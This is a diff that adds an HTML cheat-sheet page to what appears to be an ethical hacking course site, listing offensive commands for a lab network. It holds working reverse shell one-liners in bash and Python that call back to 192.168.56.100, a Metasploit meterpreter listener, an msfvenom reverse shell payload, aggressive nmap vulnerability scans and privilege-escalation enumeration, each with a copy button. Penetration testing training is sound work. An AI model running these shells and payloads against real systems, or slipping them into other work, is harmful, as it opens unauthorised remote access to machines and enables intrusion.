@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pentest Cheat Sheets — CCY4202: Ethical Hacking</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="./assets/css/base.css" />
+  <link rel="stylesheet" href="./assets/css/layout.css" />
+  <link rel="stylesheet" href="./assets/css/components.css" />
+</head>
+<body data-nav-active="cheatsheets">
+  <div data-site-nav></div>
+
+  <main class="page-full">
+    <div class="breadcrumbs">
+      <a href="./index.html">Home</a>
+      <span class="breadcrumbs__separator">/</span>
+      <span>Penetration Testing Cheat Sheets</span>
+    </div>
+
+    <header style="margin-bottom:var(--space-8);padding-bottom:var(--space-6);border-bottom:1px solid var(--color-border);">
+      <div style="display:flex;gap:var(--space-2);margin-bottom:var(--space-2);">
+        <span class="lab-badge lab-badge--time">Field Reference</span>
+        <span class="lab-badge lab-badge--difficulty">High Utility</span>
+      </div>
+      <h1 style="font-family:var(--font-mono);font-size:clamp(2rem, 4vw + 1rem, 3rem);font-weight:800;color:var(--color-text-primary);">
+        Offensive Security Cheat Sheets
+      </h1>
+      <p style="font-size:var(--font-size-lg);color:var(--color-text-secondary);max-width:75ch;margin-top:var(--space-2);">
+        Fast, battle-tested terminal commands, exploit parameters, reverse shells, and privilege escalation one-liners.
+      </p>
+    </header>
+
+    <!-- Nmap Cheat Sheet -->
+    <section style="margin-bottom:var(--space-8);">
+      <h2 style="font-family:var(--font-mono);font-size:var(--font-size-xl);color:var(--color-text-primary);margin-bottom:var(--space-4);">
+        1. Nmap Network Scanner Syntax
+      </h2>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">bash — Comprehensive TCP SYN &amp; Version Scan</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code># Fast SYN stealth scan, all 65535 ports, service banner grab, OS detect, aggressive timing
+nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 -oA target_full 192.168.56.101</code></pre>
+        </div>
+      </div>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">bash — Nmap Vulnerability Scripting Engine (NSE)</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code># Run vulnerability assessment scripts against discovered open ports
+nmap -p 80,443,445 --script vuln,exploit 192.168.56.101</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- Metasploit Cheat Sheet -->
+    <section style="margin-bottom:var(--space-8);">
+      <h2 style="font-family:var(--font-mono);font-size:var(--font-size-xl);color:var(--color-text-primary);margin-bottom:var(--space-4);">
+        2. Metasploit Framework &amp; Staged Handlers
+      </h2>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">msfconsole — Multi Handler Listener</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code># Rapid reverse TCP meterpreter listener configuration
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.100; set LPORT 4444; exploit -j"</code></pre>
+        </div>
+      </div>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">bash — msfvenom Staged Payload Generation</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code># Generate 64-bit Linux reverse shell ELF binary
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o shell.elf</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- Reverse Shell Cheat Sheet -->
+    <section style="margin-bottom:var(--space-8);">
+      <h2 style="font-family:var(--font-mono);font-size:var(--font-size-xl);color:var(--color-text-primary);margin-bottom:var(--space-4);">
+        3. Reverse Shell One-Liners
+      </h2>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">bash — Bash TCP Reverse Socket</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code>bash -i >& /dev/tcp/192.168.56.100/9001 0>&1</code></pre>
+        </div>
+      </div>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">bash — Python 3 Interactive TTY Shell</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.56.100",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- Linux Privilege Escalation -->
+    <section style="margin-bottom:var(--space-8);">
+      <h2 style="font-family:var(--font-mono);font-size:var(--font-size-xl);color:var(--color-text-primary);margin-bottom:var(--space-4);">
+        4. Linux Privilege Escalation Enumeration
+      </h2>
+
+      <div class="terminal-window">
+        <div class="terminal-window__header">
+          <div class="terminal-window__controls">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--yellow"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+          </div>
+          <span class="terminal-window__title">bash — Enumerate SUID Binaries &amp; Sudo Permissions</span>
+          <button type="button" class="terminal-copy-btn">Copy</button>
+        </div>
+        <div class="terminal-window__body">
+          <pre><code># Check current user sudo privileges without password
+sudo -l
+
+# Locate binaries with SUID permission set
+find / -perm -u=s -type f 2>/dev/null
+
+# Check capabilities
+getcap -r / 2>/dev/null</code></pre>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <div data-site-footer></div>
+
+  <script data-site-root="." src="./assets/js/site.js"></script>
+  <script src="./assets/js/lab-common.js"></script>
+  <script src="./assets/js/quiz.js"></script>
+</body>
+</html>
